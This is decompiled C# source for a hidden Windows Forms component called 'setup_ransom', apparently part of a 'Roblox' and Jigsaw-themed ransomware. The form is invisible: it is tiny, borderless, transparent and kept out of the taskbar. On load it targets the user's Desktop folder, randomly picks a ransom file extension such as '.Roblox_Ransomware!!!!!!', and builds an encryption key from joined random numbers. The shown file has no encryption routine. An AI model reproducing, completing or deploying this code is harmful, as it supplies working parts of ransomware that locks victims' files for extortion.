using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace Unlock_Encrypt0r_1._0;

[DesignerGenerated]
public class setup_ransom : Form
{
	private IContainer components;

	private Random Number_files;

	private string Number_files2;

	[field: AccessedThroughProperty("path_folder_input")]
	internal virtual Label path_folder_input
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Key_encryption")]
	internal virtual Label Key_encryption
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("files_encryption")]
	internal virtual Label files_encryption
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("path_folder_input2")]
	internal virtual Label path_folder_input2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("path_folder_input3")]
	internal virtual Label path_folder_input3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("path_folder_input4")]
	internal virtual Label path_folder_input4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("path_folder_input5")]
	internal virtual Label path_folder_input5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public setup_ransom()
	{
		((Form)this).add_Load((EventHandler)setup_ransom_Load);
		Number_files = new Random();
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		path_folder_input = new Label();
		Key_encryption = new Label();
		files_encryption = new Label();
		path_folder_input2 = new Label();
		path_folder_input3 = new Label();
		path_folder_input4 = new Label();
		path_folder_input5 = new Label();
		((Control)this).SuspendLayout();
		path_folder_input.set_AutoSize(true);
		((Control)path_folder_input).set_Location(new Point(-102, -91));
		((Control)path_folder_input).set_Name("path_folder_input");
		((Control)path_folder_input).set_Size(new Size(193, 17));
		((Control)path_folder_input).set_TabIndex(0);
		path_folder_input.set_Text("C:\\Users\\User\\Desktop\\Teser");
		Key_encryption.set_AutoSize(true);
		((Control)Key_encryption).set_Location(new Point(-102, -74));
		((Control)Key_encryption).set_Name("Key_encryption");
		((Control)Key_encryption).set_Size(new Size(0, 17));
		((Control)Key_encryption).set_TabIndex(1);
		files_encryption.set_AutoSize(true);
		((Control)files_encryption).set_Location(new Point(97, -91));
		((Control)files_encryption).set_Name("files_encryption");
		((Control)files_encryption).set_Size(new Size(32, 17));
		((Control)files_encryption).set_TabIndex(2);
		files_encryption.set_Text(".fun");
		path_folder_input2.set_AutoSize(true);
		((Control)path_folder_input2).set_Location(new Point(-102, -108));
		((Control)path_folder_input2).set_Name("path_folder_input2");
		((Control)path_folder_input2).set_Size(new Size(193, 17));
		((Control)path_folder_input2).set_TabIndex(3);
		path_folder_input2.set_Text("C:\\Users\\User\\Desktop\\Teser");
		path_folder_input3.set_AutoSize(true);
		((Control)path_folder_input3).set_Location(new Point(-102, -125));
		((Control)path_folder_input3).set_Name("path_folder_input3");
		((Control)path_folder_input3).set_Size(new Size(193, 17));
		((Control)path_folder_input3).set_TabIndex(4);
		path_folder_input3.set_Text("C:\\Users\\User\\Desktop\\Teser");
		path_folder_input4.set_AutoSize(true);
		((Control)path_folder_input4).set_Location(new Point(-102, -57));
		((Control)path_folder_input4).set_Name("path_folder_input4");
		((Control)path_folder_input4).set_Size(new Size(193, 17));
		((Control)path_folder_input4).set_TabIndex(6);
		path_folder_input4.set_Text("C:\\Users\\User\\Desktop\\Teser");
		path_folder_input5.set_AutoSize(true);
		((Control)path_folder_input5).set_Location(new Point(-102, -40));
		((Control)path_folder_input5).set_Name("path_folder_input5");
		((Control)path_folder_input5).set_Size(new Size(193, 17));
		((Control)path_folder_input5).set_TabIndex(5);
		path_folder_input5.set_Text("C:\\Users\\User\\Desktop\\Teser");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(SystemColors.ActiveBorder);
		((Form)this).set_ClientSize(new Size(10, 10));
		((Control)this).get_Controls().Add((Control)(object)path_folder_input4);
		((Control)this).get_Controls().Add((Control)(object)path_folder_input5);
		((Control)this).get_Controls().Add((Control)(object)path_folder_input3);
		((Control)this).get_Controls().Add((Control)(object)path_folder_input2);
		((Control)this).get_Controls().Add((Control)(object)files_encryption);
		((Control)this).get_Controls().Add((Control)(object)Key_encryption);
		((Control)this).get_Controls().Add((Control)(object)path_folder_input);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("setup_ransom");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("setup_ransom");
		((Form)this).set_TransparencyKey(SystemColors.ActiveBorder);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void setup_ransom_Load(object sender, EventArgs e)
	{
		path_folder_input.set_Text(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory));
		Number_files2 = Conversions.ToString(Number_files.Next(0, 20));
		Random random = new Random();
		int num = random.Next(0, 999999999);
		if (Conversions.ToDouble(Number_files2) == 1.0)
		{
			files_encryption.set_Text(".@_#JIGSAW_ROBLOX_ransom#_@!");
		}
		else if (Conversions.ToDouble(Number_files2) == 2.0)
		{
			files_encryption.set_Text("._#JIGSAW_ROBLOX#!");
		}
		else if (Conversions.ToDouble(Number_files2) == 3.0)
		{
			files_encryption.set_Text(".#FUN#_Roblox");
		}
		else if (Conversions.ToDouble(Number_files2) == 4.0)
		{
			files_encryption.set_Text(".#Encrypt#_Roblox!");
		}
		else if (Conversions.ToDouble(Number_files2) == 5.0)
		{
			files_encryption.set_Text(".#Ransom_Roblox#_Jigsaw!");
		}
		else if (Conversions.ToDouble(Number_files2) == 6.0)
		{
			files_encryption.set_Text(".!Ransom_Roblox!");
		}
		else if (Conversions.ToDouble(Number_files2) == 7.0)
		{
			files_encryption.set_Text(".#Roblox#");
		}
		else if (Conversions.ToDouble(Number_files2) == 8.0)
		{
			files_encryption.set_Text(".fun_VB");
		}
		else if (Conversions.ToDouble(Number_files2) == 9.0)
		{
			files_encryption.set_Text(".@AES@.Roblox!");
		}
		else if (Conversions.ToDouble(Number_files2) == 10.0)
		{
			files_encryption.set_Text(".AES_FUN#!");
		}
		else if (Conversions.ToDouble(Number_files2) == 11.0)
		{
			files_encryption.set_Text(".Roblox_Ransomware!!!!!!");
		}
		else if (Conversions.ToDouble(Number_files2) == 12.0)
		{
			files_encryption.set_Text(".ROBLOX");
		}
		else if (Conversions.ToDouble(Number_files2) == 13.0)
		{
			files_encryption.set_Text(".Encrypted_Roblox@mail.com");
		}
		else if (Conversions.ToDouble(Number_files2) == 14.0)
		{
			files_encryption.set_Text($".{num}_FUN");
		}
		else if (Conversions.ToDouble(Number_files2) == 15.0)
		{
			files_encryption.set_Text(".fun");
		}
		else if (Conversions.ToDouble(Number_files2) == 16.0)
		{
			files_encryption.set_Text($".ID-{num}");
		}
		else if (Conversions.ToDouble(Number_files2) == 17.0)
		{
			files_encryption.set_Text($".{num}_Roblox");
		}
		else if (Conversions.ToDouble(Number_files2) == 18.0)
		{
			files_encryption.set_Text($".ID_{num}_Infected");
		}
		else if (Conversions.ToDouble(Number_files2) == 19.0)
		{
			files_encryption.set_Text($".{num}@mail.com");
		}
		else if (Conversions.ToDouble(Number_files2) == 20.0)
		{
			files_encryption.set_Text($".{num}-Server");
		}
		else if (Conversions.ToDouble(Number_files2) == 0.0)
		{
			files_encryption.set_Text(".@Fun@.ransomware!");
		}
		Random random2 = new Random();
		string text = Conversions.ToString(random2.Next(0, 999999999)) + Conversions.ToString(random2.Next(0, 999999999)) + Conversions.ToString(random2.Next(0, 999999999)) + Conversions.ToString(random2.Next(0, 999999999)) + Conversions.ToString(random2.Next(0, 999999999)) + Conversions.ToString(random2.Next(0, 999999999)) + Conversions.ToString(random2.Next(0, 999999999)) + Conversions.ToString(random2.Next(0, 999999999)) + Conversions.ToString(random2.Next(0, 999999999)) + Conversions.ToString(random2.Next(0, 999999999)) + Conversions.ToString(random2.Next(0, 999999999)) + Conversions.ToString(random2.Next(0, 999999999)) + "==";
		Key_encryption.set_Text(text);
	}
}
